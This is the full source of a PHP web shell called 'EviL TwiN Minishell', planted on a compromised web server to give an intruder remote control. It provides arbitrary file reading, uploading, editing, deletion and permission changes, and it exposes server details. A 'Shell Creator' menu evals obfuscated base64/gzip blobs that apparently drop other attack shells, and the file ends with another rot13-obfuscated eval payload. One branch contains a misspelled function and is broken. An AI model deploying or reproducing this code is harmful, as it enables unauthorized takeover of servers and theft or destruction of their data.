<?php error_reporting(0);set_time_limit(0);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}echo '<!DOCTYPE HTML><html><head><meta name="author" content="Evil Twin"><meta name="theme-color" content="#1F1F1F"><meta name="robots" content="noindex, nofollow, noarchive"><link href="https://fonts.googleapis.com/css2?family=Inika&display=swap" rel="stylesheet"><style>body { font-family: "Inika", serif; background-color: #1F1F1F; color:white;} tr:hover{ background-color: #1F1F1F;}.first{ background-color: #1F1F1F;}table{ border: 1px #FFFFFF solid;}a{color:white;text-decoration: none;}a:hover{color:lime;}input,select,textarea{border: 1px #FFFFFF solid;-moz-border-radius: 5px;-webkit-border-radius:5px;border-radius:5px;}</style><title>EviL TwiN Minishell</title></head><body><center><a href="?"><font size="5">EviL TwiN Mini</font><font size="5" color="lime">$</font><font size="5">hell</font></a></center><table width="730" border ="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font color="white">Path :</font> ';if(isset($_GET['eviltwin'])){$eviltwin = $_GET['eviltwin'];}else{$eviltwin = getcwd();}$eviltwin = str_replace('\\','/',$eviltwin);$eviltwins = explode('/',$eviltwin);foreach($eviltwins as $id=>$pat){if($pat == '' && $id == 0){$a = true;echo '<a href="?eviltwin=/">/</a>';continue;}if($pat == '') continue;echo '<a href="?eviltwin=';for($i=0;$i<=$id;$i++){echo "$eviltwins[$i]";if($i != $id) echo "/";}echo '">'.$pat.'</a>/';}echo '</td></tr><tr><td>';$ip = gethostbyname($_SERVER['HTTP_HOST']);$system = php_uname();$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $eviltwin);if(isset($_FILES['file'])){if(copy($_FILES['file']['tmp_name'],$eviltwin.'/'.$_FILES['file']['name'])){echo '<font color="lime">Upload successfully</font><br />';}else{echo '<font color="white">Upload failed</font><br/>';}}echo '<font>Safe Mode : '.$sm.'</font><br><font>Server IP : '.$ip.'</font><br><font>System : '.$system.'</font><br><form enctype="multipart/form-data" method="POST"><font color="white">File Upload :</font> <input type="file" name="file"><input type="submit" value="Go!"></form><form method="post"><font>Shell Creator : </font><select name="eviltwin"><option selected>Select</option><option value="idx">Indoxploit (3)</option><option value="wso">Wso (4.2.5)</option><option value="b374k">B374k (3.2.3)</option><option value="marijuana">Marijuana (1)</option><option value="alfa">Alfa (4)</option><option value="noname">Noname (1)</option><option value="ets">Evil Twin (1.3)</option></select><input type="submit" value="Get!"></form></center>';if($_POST['eviltwin'] == 'idx') {eval(gzinflate(base64_decode('vVJNa+MwED2n0P8wmIAdMNG9dQxtcSBsSIvjLtuTUZRRLapKRpJpYOl/7zh26C5toXvZg5H1Zt578yHZGRGUNaD2h2TaOZ3CVHk1g9/nZ5PJVLawAGlbNEkPpxC9RLPLY0g0FBLEqJVRIRlQmMCAeQy2DQllpXBzX65v76qaDlKn6Ddyr1ebq/KhKq8222VRphBch9+glUV1X27+mbbdruufRblaPtwVPU1y7U88gMmXvOVqXVBLsh1yHYbOmcEGDyj65CFyhIS2Ht8xOd5PbLurpe58M47yj/9X+pRMpNJIusoHn8S0r3nbtPFsXBWKxkKUCTQBXZ5Ja0KecWgcykU8lZ3W7ESBwN0jhkVc7zQ3T3Ge57Aye/ur1VYF2DaoNWRZxniesUGIjbrRsRxAGs9gS2X1LydqQmj9BWOOv8wfVWi6XefRCSITcS7sM7u+rX5sqjV7Isxq9sw9CTJFvoejb19alEZjkdGpr//Z2F+dfWq85LSDPQQLwiEP+FH+IvlCuh/cGw==')));} elseif($_POST['eviltwin'] == 'wso') {eval(gzinflate(base64_decode('vZJdS+NAFIavK/gfDqGQFEIHRG80DeiSQrG0kkTFqzCdPWMGx0yYmdCFZf/7njQpKii4N3sRknnPed7zMZFdI7wyDeydiaad1TFMlVMz+H16MplMZQsLkKbFJurlGIJ9MLs6hERNIUFEpRrlo0GFCQyaQ29aH1FWDD/u8/X2rqzoRe4U/UbuzWpznT+V+fWmWGZ5DN52+A0sz8r7fPPPWFGsq4csXy2f7rIek1y7Iwcw+ZJbrtYZjSTbIdei72wzlMFfKPrkIXKQhDYO3zQ5no+02VVSd64eV/nu+w89SkZSaSRf5byLQrqveVu34Wy8KhS1gSAR2Hi0aSJN49OEQ21RLsKp7LRmRwQ8t8/oF2G107x5CdM0hcdiC0WNWkOSJIynCRsc2GgYHPoApL0M9aif/pcJau9bd8mY5fv5s/J1t+scWkEwgXNhXtnNtrzdlGv2QprR7JU7MuybOT+76PsJ4mDsLDgO81+m+TDOpxWXnDb+E7wBYZF7fOd7GX3h2a/pLw==')));} elseif($_POST['eviltwin'] == 'b374k') {eval(gzinflate(base64_decode('vVJRa9swEH7OYP/hMAE7YCJoBoPWMTTFgdCQFsct9Mko2qkWUS0jyXQw9t93jpK1hRXalz0YWd/d9913d5J9K7wyLexm37/tk3FvdQpj5dQEfn39MhqNZQdzkKbDNhngFKLnaHJxCImGQoIYtWqVTwIKIwiYQ286n1BWCld35frmtqrpIHWKfiB3sdpclg9VebnZLosyBW97/ACtLKq7cvNp2na7ru+LcrV8uC0GmuTanXgAo3d5y9W6oJZkF3It+t62oQz+RDEkh8gBEto4fMHk8X5im10tde+a4yhf/f+mT8lEKo2kq5x3SXzY2LRrunhyXBaKxkCUCWw92jyTpvV5xqGxKOfxWPZasxcSeG4f0c/jeqd5u4/zPIcFRa9h26DWkGUZ43nGggo7ikYHN4A0nVCTXIWnEzXed+6cMcufp4/KN/2ud2gF0Yk6FeaJLW6q6021ZnvCjGZP3JFksDQ7mw2uojT66zA6tfXf+nrT2D+rLjlt4Ad4A8Ii9/hG+Tx5R3UY2R8=')));} elseif($_POST['eviltwin'] == 'marijuana') {eval(gzinflate(base64_decode('vVJNa9tAED270P8wCINkENY9lQVykMGtqwRZLuQk1tvZaOP1rtgPUgj5711ZdhLTBJxLD2K1b+a9eTOzzElquZKwJ5o/OCJJNHZaxDDmhk/g6euX0WjMOpgBUx3KqIdjCB6DybdDiLY+RD2j4ZLbaEBhBANm0KrORj4rhutNtbq5rRt/eHUfvSB3vizz6q6u8nK9KKoYrHZ4Aa0q6k1Vfpq2Xq+aX0W1XNzdFj2NEWFOPIDRh7zFclX4llg35Gq0TsuhDP5B2icPkQNEhTL4irHj/cRW24YJZ9rjKN/8P/uPs4hxgV6XG2ui8GVr067twslxYUhbBUFKUVrUWcqUtFlKoNXIZuGYOSGScyJYou/RzsJmK4jchVmWwc+8Wn7f5GUO6xaFgDRNE5KlyaCWHMWDgzNAP6mhtnf4+pSC1trOXCWJJo/Te25bt3UGNfUSnj6lap/Mb+ofZb1Kdh5TvS/jZQ/2qBK8dxfEwZnb4NTmf+/zrNF3qy+I385vsAqoRmLxH/Wr6APlfox/AQ==')));} elseif($_POST['eviltwin'] == 'alfa') {eval(gzinflate(base64_decode('vVJNS8NAED1X8D8MoZAUQveuaaCVFIqlShoFT2G7zprFNRt2NyiI/91J0voBCvXiIST73rw3b2Yj21p4ZWrgWvJo3Fodw1g5NYHX05PRaCwbmIE0DdZRB8cQPAeT854SFVGCFKWqlY8GFEYwYA69aXxEVTFc3OTrq+uipBe5E3tE7WK1med3RT7fbJdZHoO3LR4hy7PiJt/8WbbdrsvbLF8t766zTia5dgcdwOhX3XK1zmgk2Qy1Fn1r66ENvqDoigemh4Q2Dj8xuT8f1GZXSt26ar/KL99v9CgZSaWRfJXzLgq7C5s2VRNO9neFojIQJAJrjzZNpKl9mnCoLMpZOJat1uxDA57bB/SzsNxpXj+GaZrCnEjYVqg1JEnCeJqwwYPtLYM+CiCtZuhIkfrfJqi8b9wZY5Y/Tx+Ur9pd69AKUpNyKswTW1wVl5tizR4JM5o9cUeOfR6PTvehgjg45AsOM/3TUN+m+rHnktPu78EbEBYp81fjs+gX025d7w==')));} elseif($_POST['eviltwin'] == 'noname') {eval(gzinflate(bsse64_decode('vVLBauMwED2nsP8wmIAdMNG96xjaxYHQ4BbHWejJKNpRLapIRpJpoey/7zh2aAtbaC89GFlv5r15MyPZGxGUNWCs4UdM5r3TKcyVVwt4+XExm81lByuQtkOTDHAK0VO0+HkKiZZCghiNMiokIwozGDGPwXYhoawUfu2r7e1d3dBB6hT9RO71pryq7uvqqtytiyqF4Hr8BK0q6n1Vfpm2222b30W1Wd/fFQNNcu3PPIDZh7z1ZltQS7Ibcx2G3pmxDD6jGJLHyAkS2np8xeR0P7PtoZG69+00yjf/f+lTMpFKI+kqH3wSjytbdm0XL6ZtoWgtRJlAE9DlmbQm5BmH1qFcxXPZa83esCBw94BhFTcHzc1jnOc5lLakMOxa1BqyLGM8z9iowybZ6GQIkAY0ViVj0/OJ2hA6f8mY40/LBxXa/tB7dIL4xF0Ke2TXt/VNWW/ZI2FWsyP3pDm58kPVwVqURq8+o3N339jeu/7+W3fNaRd/IFgQDnnA99KXyQeyw+j+AQ==')));} elseif($_POST['eviltwin'] == 'ets') {eval(gzinflate(base64_decode('vVJNa+MwED2n0P8wmIAdcKN76xjaxYHQkBbHXejJKNpRLapKRpKbhWX/+45jh3ZpC+2lByPrzbz35kOyMyIoawCDT6ad0ylMlVcz+HN6MplMZQsLkLZFk/RwCtE+ml0cQqKhkCBGrYwKyYDCBAbMY7BtSCgrhR935frmtqrpIHWKfiL3arW5LO+r8nKzXRZlCsF1+AlaWVR35ebLtO12Xf8sytXy/rboaZJrf+QBTD7kLVfrglqS7ZDrMHTODDb4G0WfPEQOkNDW4wsmx/uRbXe11J1vxlG++v9Ln5KJVBpJV3laVUz7mrdNG8/GVaFoLESZQBPQ5Zm0JuQZh8ahXMRT2WnNjhQI3D1gWMT1TnPzGOd5DsWz0lDtlYFtg1pDlmWM5xkbdNgoGx2qAaTpDK5UVf9woiaE1p8z5vh+/qBC0+06j04QmYhzYZ/Y1U11vanW7JEwq9kT9yTIkGwDuZ753rWvLkqjsc7o2No39vZfc+/6Ljlt4RcEC8IhD/hG/Tz5QLkf3T8='))); }echo '</td></tr>';if(isset($_GET['filesrc'])){echo "<tr><td>Current File : ";echo $_GET['filesrc'];echo '</tr></td></table><br />';echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){echo '</table><br /><center>'.$_POST['eviltwin'].'<br /><br />';if($_POST['opt'] == 'chmod'){if(isset($_POST['perm'])){if(chmod($_POST['eviltwin'],$_POST['perm'])){echo '<font color="lime">Change permission successfully</font><br/>';}else{echo '<font color="red">Change permission failed</font><br />';}}echo '<form method="POST">Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['eviltwin'])), -4).'" /><input type="hidden" name="eviltwin" value="'.$_POST['eviltwin'].'"><input type="hidden" name="opt" value="chmod"><input type="submit" value="Go" /></form>';}elseif($_POST['opt'] == 'rename'){if(isset($_POST['newname'])){if(rename($_POST['eviltwin'],$eviltwin.'/'.$_POST['newname'])){echo '<font color="lime">Rename successfully</font><br/>';}else{echo '<font color="white">Rename failed</font><br />';}$_POST['name'] = $_POST['newname'];}echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="eviltwin" value="'.$_POST['eviltwin'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';}elseif($_POST['opt'] == 'edit'){if(isset($_POST['src'])){$fp = fopen($_POST['eviltwin'],'w');if(fwrite($fp,$_POST['src'])){echo '<font color="lime">File edit successfully</font><br/>';}else{echo '<font color="white">Failed to edit file</font><br/>';}fclose($fp);}echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['eviltwin'])).'</textarea><br /><input type="hidden" name="eviltwin" value="'.$_POST['eviltwin'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /></form>';}echo '</center>';}else{echo '</table><br/><center>';if(isset($_GET['option']) && $_POST['opt'] == 'delete'){if($_POST['type'] == 'dir'){if(rmdir($_POST['eviltwin'])){echo '<font color="lime">Directory deleted successfully</font><br/>';}else{echo '<font color="red">Delete directory failed</font><br/>';}}elseif($_POST['type'] == 'file'){if(unlink($_POST['eviltwin'])){echo '<font color="lime">File Deleted</font><br/>';}else{echo '<font color="white">File Failed to Delete</font><br/>';}}}echo '</center>';if(function_exists('opendir')) {if($opendir = opendir($eviltwin)) {while(($readdir = readdir($opendir)) !== false) {$scandir[] = $readdir;}closedir($opendir);}sort($scandir);} else {$scandir = scandir($eviltwin);}echo '<div id="content"><table width="730" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"><td><center>NAME</center></td><td><center>SIZE</center></td><td><center>PERMISSION</center></td><td><center>MODIFY</center></td></tr>';foreach($scandir as $dir){if(!is_dir($eviltwin.'/'.$dir) || $dir == '.' || $dir == '..') continue;echo '<tr><td><a href="?eviltwin='.$eviltwin.'/'.$dir.'">'.$dir.'</a></td><td><center>--</center></td><td><center>';if(is_writable($eviltwin.'/'.$dir)) echo '<font color="lime">';elseif(!is_readable($eviltwin.'/'.$dir)) echo '<font color="white">';echo perms($eviltwin.'/'.$dir);if(is_writable($eviltwin.'/'.$dir) || !is_readable($eviltwin.'/'.$dir)) echo '</font>';echo '</center></td><td><center><form method="POST" action="?option&eviltwin='.$eviltwin.'"><select name="opt"><option value="">Select</option><option value="delete">Delete</option><option value="chmod">Chmod</option><option value="rename">Rename</option></select><input type="hidden" name="type" value="dir"><input type="hidden" name="name" value="'.$dir.'"><input type="hidden" name="eviltwin" value="'.$eviltwin.'/'.$dir.'"><input type="submit" value=">"></form></center></td></tr>';}echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';foreach($scandir as $file){if(!is_file($eviltwin.'/'.$file)) continue;$size = filesize($eviltwin.'/'.$file)/1024;$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}echo '<tr><td><a href="?filesrc='.$eviltwin.'/'.$file.'&eviltwin='.$eviltwin.'">'.$file.'</a></td><td><center>'.$size.'</center></td><td><center>';if(is_writable($eviltwin.'/'.$file)) echo '<font color="lime">';elseif(!is_readable($eviltwin.'/'.$file)) echo '<font color="white">';echo perms($eviltwin.'/'.$file);if(is_writable($eviltwin.'/'.$file) || !is_readable($eviltwin.'/'.$file)) echo '</font>';echo '</center></td><td><center><form method="POST" action="?option&eviltwin='.$eviltwin.'"><select name="opt"><option value="">Select</option><option value="delete">Delete</option><option value="chmod">Chmod</option><option value="rename">Rename</option><option value="edit">Edit</option></select><input type="hidden" name="type" value="file"><input type="hidden" name="name" value="'.$file.'"><input type="hidden" name="eviltwin" value="'.$eviltwin.'/'.$file.'"><input type="submit" value=">"></form></center></td></tr>';}echo '</table></div>';}echo '<center><br><a href="https://github.com/eviltwin-dev/eviltwin-minishell"><font color="white">&copy; Evil Twin</font></a></center></body></html>';function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));return $info;}; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d')))); ?>
